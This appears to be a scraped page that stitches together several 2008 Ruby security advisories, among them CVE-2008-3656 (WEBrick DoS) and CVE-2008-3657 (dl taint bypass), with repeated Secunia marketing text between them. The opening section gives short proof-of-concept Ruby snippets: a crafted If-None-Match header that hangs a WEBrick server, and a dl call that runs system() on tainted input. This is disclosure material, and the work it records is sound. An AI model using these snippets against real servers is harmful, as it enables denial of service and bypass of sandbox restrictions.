How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

These vulnerabilities were reported by Keita Yamaguchi.

### DoS vulnerability in WEBrick

WEBrick::HTTP::DefaultFileHandler is faulty of exponential time taking
requests due to a backtracking regular expression in
WEBrick::HTTPUtils.split\_header\_value.

Exploitable server:

```
require 'webrick'
WEBrick::HTTPServer.new(:Port => 2000, :DocumentRoot => "/etc").start

```

Attack:

```
require 'net/http'
res = Net::HTTP.start("localhost", 2000) { |http|
  req = Net::HTTP::Get.new("/passwd")
  req['If-None-Match'] = %q{meh=""} + %q{foo="bar" } * 100
  http.request(req)
}
p res

```

The request likely won't finish in this universe.

This vulnerability was reported by Christian Neukirchen.

### Lack of taintness check in dl

dl doesn't check taintness, so it could allow attackers to call
dangerous functions.

```
require 'dl'
$SAFE = 1
h = DL.dlopen(nil)
sys = h.sym('system', 'IP')
uname = 'uname -rs'.taint
sys[uname]

```

This vulnerability was reported by sheepman.

### DNS spoofing vulnerability in resolv.rb

resolv.rb allow remote attackers to spoof DNS answers. This risk can be
reduced by randomness of DNS transaction IDs and source ports, so
resolv.rb is fixed to randomize them.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

ruby security update (RHSA-2008-0897)

Original Release Date: October 22, 2008

Last Revised: October 22, 2008

Number: ASA-2008-424

Risk Level: None

Advisory Version: 1.0

Advisory Status: Final

---

## 1. Overview:

Ruby is an interpreted scripting language for quick and easy
object-oriented programming.

The Ruby DNS resolver library, resolv.rb, used predictable transaction IDs
and a fixed source port when sending DNS requests. A remote attacker could
use this flaw to spoof a malicious reply to a DNS query. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3905](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3905) to this issue.

Ruby's XML document parsing module (REXML) was prone to a denial of service
attack via XML documents with large XML entity definitions recursion. A
specially-crafted XML file could cause a Ruby application using the REXML
module to use an excessive amount of CPU and memory. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3790](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3790) to this issue.

An insufficient "taintness" check flaw was discovered in Ruby's DL module,
which provides direct access to the C language functions. An attacker could
use this flaw to bypass intended safe-level restrictions by calling
external C functions with the arguments from an untrusted tainted inputs.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3657](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3657) to this issue.

A denial of service flaw was discovered in WEBrick, Ruby's HTTP server
toolkit. A remote attacker could send a specially-crafted HTTP request to a
WEBrick server that would cause the server to use an excessive amount of
CPU time. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3656](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3656) to this issue.

A number of flaws were found in the safe-level restrictions in Ruby. It
was possible for an attacker to create a carefully crafted malicious script
that can allow the bypass of certain safe-level restrictions. The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3655](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3655) to this issue.

A denial of service flaw was found in Ruby's regular expression engine. If
a Ruby script tried to process a large amount of data via a regular
expression, it could cause Ruby to enter an infinite-loop and crash.
The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name [CVE-2008-3443](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3443) to this issue.

No Avaya system products using RHEL4 are vulnerable, as ruby is not installed by default.

More information about these vulnerabilities can be found in the security advisory issued by RedHat Linux:

* <https://rhn.redhat.com/errata/RHSA-2008-0897.html>

## 2. Avaya System Products using RHEL4 with ruby installed: None

## 3. Avaya Software-Only Products:

Avaya software-only products operate on general-purpose operating systems.
Occasionally vulnerabilities may be discovered in the underlying operating system or
applications that come with the operating system. These vulnerabilities often do not
impact the software-only product directly but may threaten the integrity of the
underlying platform.

In the case of this advisory Avaya software-only products are not affected by the
vulnerability directly but the underlying Linux platform may be. Customers should
determine on which Linux operating system the product was installed and then follow
that vendor's guidance.

| Product: | Actions: |
| --- | --- |
| CVLAN | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the CVLAN application. |
| Avaya Integrated Management Suite (IMS) | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the IMS application. |
| Voice Portal | Depending on the Operating System provided by customers, the affected package may be installed on the underlying Operating System supporting the Voice Portal application. |

**Recommended Actions:**
In the event that the affected package is installed, Avaya recommends that customers follow recommended actions supplied by RedHat Linux.

CVE ID         : CVE-2008-3655 CVE-2008-3656 CVE-2008-3657 CVE-2008-3790 CVE-2008-3905

Several vulnerabilities have been discovered in the interpreter for
the Ruby language, which may lead to denial of service and other
security problems. The Common Vulnerabilities and Exposures project
identifies the following problems:

CVE-2008-3655

    Keita Yamaguchi discovered that several safe level restrictions
    are insufficiently enforced.

CVE-2008-3656

    Christian Neukirchen discovered that the WebRick module uses
    inefficient algorithms for HTTP header splitting, resulting in
    denial of service through resource exhaustion.

CVE-2008-3657

    It was discovered that the dl module doesn't perform taintness
    checks.

CVE-2008-3790

    Luka Treiber and Mitja Kolsek discovered that recursively nested
    XML entities can lead to denial of service through resource
    exhaustion in rexml.

CVE-2008-3905

    Tanaka Akira discovered that the resolv module uses sequential
    transaction IDs and a fixed source port for DNS queries, which
    makes it more vulnerable to DNS spoofing attacks.

For the stable distribution (etch), these problems have been fixed in
version 1.8.5-4etch3. Packages for arm will be provided later.

For the unstable distribution (sid), these problems have been fixed in
version 1.8.7.72-1.

We recommend that you upgrade your ruby1.8 packages.

Package        : ruby1.9
Vulnerability  : several
Problem-Type   : local(remote)
Debian-specific: no
CVE ID         : CVE-2008-3655 CVE-2008-3656 CVE-2008-3657 CVE-2008-3790 CVE-2008-3905

Several vulnerabilities have been discovered in the interpreter for
the Ruby language, which may lead to denial of service and other
security problems. The Common Vulnerabilities and Exposures project
identifies the following problems:

CVE-2008-3655

    Keita Yamaguchi discovered that several safe level restrictions
    are insufficiently enforced.

CVE-2008-3656

    Christian Neukirchen discovered that the WebRick module uses
    inefficient algorithms for HTTP header splitting, resulting in
    denial of service through resource exhaustion.

CVE-2008-3657

    It was discovered that the dl module doesn't perform taintness
    checks.

CVE-2008-3790

    Luka Treiber and Mitja Kolsek discovered that recursively nested
    XML entities can lead to denial of service through resource
    exhaustion in rexml.

CVE-2008-3905

    Tanaka Akira discovered that the resolv module uses sequential
    transaction IDs and a fixed source port for DNS queries, which
    makes it more vulnerable to DNS spoofing attacks.

For the stable distribution (etch), these problems have been fixed in
version 1.9.0+20060609-1etch3. Packages for arm will be provided later.

For the unstable distribution (sid), these problems have been fixed in
version 1.9.0.2-6.

We recommend that you upgrade your ruby1.9 packages.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

* Memory corruption ("beg + rlen") in the
  rb\_ary\_splice() and rb\_ary\_replace() functions (CVE-2008-2726).

Furthermore, several other vulnerabilities have been reported:

* Tanaka Akira reported an issue with resolv.rb that enables
  attackers to spoof DNS responses (CVE-2008-1447).
* Akira Tagoh
  of RedHat discovered a Denial of Service (crash) issue in the
  rb\_ary\_fill() function in array.c (CVE-2008-2376).
* Several
  safe level bypass vulnerabilities were discovered and reported by Keita
  Yamaguchi (CVE-2008-3655).
* Christian Neukirchen is credited
  for discovering a Denial of Service (CPU consumption) attack in the
  WEBRick HTTP server (CVE-2008-3656).
* A fault in the dl module
  allowed the circumvention of taintness checks which could possibly lead
  to insecure code execution was reported by "sheepman"
  (CVE-2008-3657).
* Tanaka Akira again found a DNS spoofing
  vulnerability caused by the resolv.rb implementation using poor
  randomness (CVE-2008-3905).
* Luka Treiber and Mitja Kolsek
  (ACROS Security) disclosed a Denial of Service (CPU consumption)
  vulnerability in the REXML module when dealing with recursive entity
  expansion (CVE-2008-3790).

### Impact

These vulnerabilities allow remote attackers to execute arbitrary code,
spoof DNS responses, bypass Ruby's built-in security and taintness
checks, and cause a Denial of Service via crash or CPU exhaustion.

### Workaround

There is no known workaround at this time.

### Resolution

All Ruby users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=dev-lang/ruby-1.8.6_p287-r1"
```

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
